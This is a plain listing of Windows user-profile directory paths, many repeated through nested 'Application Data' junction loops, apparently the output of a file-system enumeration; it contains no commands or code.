     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                        
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                 
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                              
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                              
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                       
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                           
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                  
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                               
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                          
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                          
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                   
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                                
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                         
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                    
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                                     
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\AppData\Local\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\AppData\Local\Temporary Internet Files\Low\IE
     C:\Users\Administrator\AppData\Local\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\AppData\Local\History
     C:\Users\Administrator\AppData\Local\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\AppData\Local\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\AppData\Local\History\History.IE5
     C:\Users\Administrator\My Documents\My Videos
     C:\Users\Administrator\My Documents\My Pictures
     C:\Users\Administrator\My Documents\My Music
     C:\Users\Administrator\Cookies\DNTException
     C:\Users\Administrator\Documents\My Videos
     C:\Users\Administrator\Documents\My Pictures
     C:\Users\Administrator\Documents\My Music
     C:\Users\Administrator\Local Settings\History\History.IE5
     C:\Users\Administrator\Local Settings\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\Local Settings\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\Local Settings\History
     C:\Users\Administrator\Local Settings\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\Local Settings\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Temporary Internet Files\Low\IE
     C:\Users\Administrator\Local Settings\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\Local Settings\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\Local Settings\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\Local Settings\Application Data\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                                    
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                   
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                        
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                               
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                               
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                  
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                         
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                         
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                              
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                 
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                          
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                      
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                             
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                             
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                       
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                       
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                               
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                        
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                    
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                          
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                          
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                   
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                       
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                               
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                     
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                         
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                             
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                        
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                        
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                 
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                              
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                              
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                       
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                           
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                  
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                               
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                          
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                          
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                   
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                                
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                                         
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                                    
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                                                            
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\Local Settings\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\Local Settings\Application Data\Temporary Internet Files
     C:\Users\Administrator\Local Settings\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\Local Settings\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\Local Settings\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\Local Settings\Application Data\History
     C:\Users\Administrator\Local Settings\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\Local Settings\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\Local Settings\Application Data\History\History.IE5
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Public\Documents\My Videos
     C:\Users\Public\Documents\My Pictures
     C:\Users\Public\Documents\My Music
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users\Application Data\Documents\My Music
     C:\Users\All Users\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Documents\My Music
     C:\Users\All Users\Application Data\Application Data\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Application Data\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                                                                                                       
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                                                                                                                    
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                                                                                                      
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                                                                     
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                                                                                  
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                                                                    
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                                                                                             
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                                   
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                                                
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                                  
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                                                           
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                 
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                         
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                                          
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                 
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                               
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                  
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                                                                            
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                                                   
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                                                                 
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                                                    
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol                                                                                                                                              
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos                                                                                                                                     
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures                                                                                                                                   
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music                                                                                                                                      
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Documents\My Music
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Documents\My Music
     C:\Users\All Users\Application Data\Application Data\ntuser.pol
     C:\Users\All Users\Application Data\Application Data\Documents\My Videos
     C:\Users\All Users\Application Data\Application Data\Documents\My Pictures
     C:\Users\All Users\Application Data\Application Data\Documents\My Music
     C:\Users\All Users\ntuser.pol
     C:\Users\All Users
     C:\Users\All Users\Documents\My Videos
     C:\Users\All Users\Documents\My Pictures
     C:\Users\All Users\Documents\My Music
     C:\Users\cyork\AppData\Local\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\AppData\Local\Application Data\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                                         
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                                                     
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                            
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                                                   
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                                        
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                           
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                                    
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                                       
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                          
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010920200110                                                                                 
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\Low\History.IE5                                                                                                      
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                      
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                         
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                  
     C:\Users\cyork\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                              
